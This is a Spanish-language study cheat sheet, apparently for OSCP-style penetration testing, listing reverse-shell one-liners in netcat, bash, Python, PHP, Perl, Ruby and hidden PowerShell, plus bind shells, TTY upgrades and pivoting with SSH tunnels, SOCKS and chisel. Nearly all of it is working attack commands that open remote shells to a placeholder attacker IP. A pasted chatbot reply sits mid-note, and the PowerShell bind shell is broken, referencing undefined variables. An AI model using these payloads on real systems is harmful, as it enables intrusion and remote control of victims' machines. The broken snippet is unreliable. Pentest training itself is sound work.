## 📚 **Índice**

- [[#🎧 1. Reverse Shells con Netcat]]
- [[#🧠 2. Reverse Shell en Bash]]
- [[#🐍 3. Reverse Shell en Python]]
- [[#🌐 4. Reverse Shell en PHP]]
- [[#💎 5. Reverse Shell en Perl]]
- [[#💢 6. Reverse Shell en Ruby]]
- [[#💻 7. Reverse Shell en PowerShell (Windows)]]
- [[#🎧 8. Listener universal (siempre necesario)]]
- [[#🔧 9. Mejorar la TTY al obtener la shell]]
- [[#🧩 10. Cuándo usar qué reverse shell]]
- [[#🔗 11. Bind Shells (el servidor escucha, tú te conectas)]]
- [[#🛰️ 12. Forward Shells (Pivoting / Port Forward / SOCKS)]]


---

# 🎧 **1. Reverse Shells con Netcat**

## ✔️ 1.1. Netcat con `-e` (versiones antiguas o ncat)

```
nc -e /bin/bash TU_IP 443
```

Super simple.  
No funciona en nc-openbsd.

---

## ✔️ 1.2. Netcat sin `-e` (nc-openbsd, el más común hoy)

```
mkfifo /tmp/f; nc TU_IP 443 < /tmp/f | /bin/bash > /tmp/f
```

---

## ✔️ 1.3. Ncat (Nmap)

```
ncat --ssl TU_IP 443 -e /bin/bash
```

---

# 🧠 **2. Reverse Shell en Bash** 

```
bash -i >& /dev/tcp/TU_IP/443 0>&1
```

Versión sin colores / más estable y la mejor de todas las que existen:

```
bash -c "bash -i >& /dev/tcp/TU_IP/443 0>&1"
```

---

# 🐍 **3. Reverse Shell en Python**

## Python2:

```
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

## Python3:

```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

---

# 🌐 **4. Reverse Shell en PHP**

```
php -r '$sock=fsockopen("TU_IP",443);exec("/bin/bash <&3 >&3 2>&3");'
```

---

# 💎 **5. Reverse Shell en Perl**

```
perl -e 'use Socket;$i="TU_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash");'
```

---

# 💢 **6. Reverse Shell en Ruby**

```
ruby -rsocket -e 'c=TCPSocket.new("TU_IP",443);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

# 💻 **7. Reverse Shell en PowerShell** (Windows)

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('==TU_IP==',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()}"
```

---

# 🎧 **8. Listener universal (siempre necesario)**

```
sudo nc -nlvp 443
```

---

# 🔧 **9. Mejorar la TTY al obtener la shell**

```
script /dev/null -c bash
export TERM=xterm
stty rows 50 columns 200
```

O el clásico:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# 🧩 **10. Cuándo usar qué reverse shell**

|Lenguaje detectado|Shell recomendada|
|---|---|
|Bash disponible|`/dev/tcp/`|
|Python presente|reverse shell Python|
|Netcat con `-e`|easy mode|
|nc-openbsd|FIFO trick|
|PHP server-side|PHP reverse|
|Windows|PowerShell|

---

Perfecto, **te agrego dos secciones nuevas a tu nota** (Bind Shells y Port Forwarding / Pivoting Shells) en **formato Obsidian**, con **emojis**, **ejemplos prácticos** y **listas completas de comandos**.

AL FINAL también te doy **el índice actualizado** para que quede perfecto.

---

# 🔗 **11. Bind Shells (el servidor escucha, tú te conectas)**

Un **bind shell** es lo contrario a una reverse shell:

👉 **La víctima abre un puerto y tú te conectas a él.**

Esto solo funciona cuando:

✔ el firewall de la víctima permite conexiones entrantes  
❌ NO funciona detrás de NAT sin port forwarding  
✔ útil cuando reverse shells están bloqueadas  
✔ usado en OSCP en máquinas antiguas o servicios internos

---

## ✔️ **11.1. Bind Shell con Netcat (-lvp)**

En la **víctima** (máquina comprometida):

```
nc -nlvp 4444 -e /bin/bash
```

En tu máquina atacante:

```
nc VICTIMA_IP 4444
```

---

## ✔️ **11.2. Bind Shell universal (nc-openbsd sin -e)**

En la víctima:

```
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash 2>&1 | nc -nlvp 4444 > /tmp/f
```

Tú te conectas:

```
nc VICTIMA_IP 4444
```

---

## ✔️ **11.3. Bind Shell con Ncat (Nmap)**

En la víctima:

```
ncat -lvp 4444 -e /bin/bash
```

Atacante:

```
ncat VICTIMA_IP 4444
```

---

## ✔️ **11.4. Bind Shell en PowerShell (Windows)**

Víctima:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression(New-Object Net.Sockets.TcpListener('0.0.0.0',4444)); while(1){$client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $stream.Write(([text.encoding]::ASCII).GetBytes($sendback),0,$sendbytes.Length); $stream.Flush()}}"
```

Atacante:

```
nc VICTIMA_IP 4444
```

---

# 🛰️ **12. Forward Shells (Pivoting / Port Forward / SOCKS)**

Esto NO es una shell nueva, sino una **técnica de movimiento lateral**:

👉 Usas una máquina comprometida para acceder a **SERVICIOS INTERNOS**  
👉 Permite enumerar redes, bases de datos, puertos internos  
👉 INFALTABLE para OSCP, HTB, e infraestructura real

Existen 3 tipos:

---

# 🎯 **12.1. Local Port Forwarding (LPORT → destino interno)**

Funciona así:

```
TÚ → Máquina comprometida → Servicio interno
```

Si comprometes 10.10.10.5 y esta ve 172.16.1.10:3306, haces:

```
ssh -L 3306:172.16.1.10:3306 user@10.10.10.5
```

Ahora:

```
mysql -h 127.0.0.1 -P 3306 -u root -p
```

y estás llegando al **servicio de la red interna**.

---

# 🎯 **12.2. Remote Port Forwarding (víctima expone servicio hacia ti)**

```
Victima → Atacante → Acceso externo
```

Si la víctima accede a 172.16.1.50:22 pero tú no, puedes hacer:

```
ssh -R 2222:172.16.1.50:22 user@TU_IP
```

Ahora tú te conectas a:

```
ssh -p 2222 localhost
```

---

# 🎯 **12.3. SOCKS Proxy (pivoting total)**

El método **más profesional**.

Primero:

```
ssh -D 9050 user@10.10.10.5
```

Luego en tu terminal:

```
export ALL_PROXY=socks5://127.0.0.1:9050
```

Ahora puedes usar:

```
nmap
crackmapexec
proxychains
curl
firefox
```

TODO pasa por la víctima y navega la red interna **como si estuvieras dentro**.

---

# 📡 **12.4. Port Forwarding con Chisel (la joya moderna)**

## En tu máquina atacante (server):

```
chisel server -p 9001 --reverse
```

## En la víctima:

```
chisel client TU_IP:9001 R:8000:172.16.1.10:80
```

Ahora visitar:

```
http://localhost:8000
```

Y verás el servicio interno.

---

# 🧠 **12.5. Táctica OSCP: enumeración interna**

Una vez pivotas:

```
proxychains nmap -sT -Pn 172.16.1.0/24
```

Y descubres:

- SMB internos
    
- bases de datos internas
    
- Jenkins
    
- Tomcat
    
- APIs privadas
    
- RCE internas
    

El pivoting decide el 50% del OSCP.

---
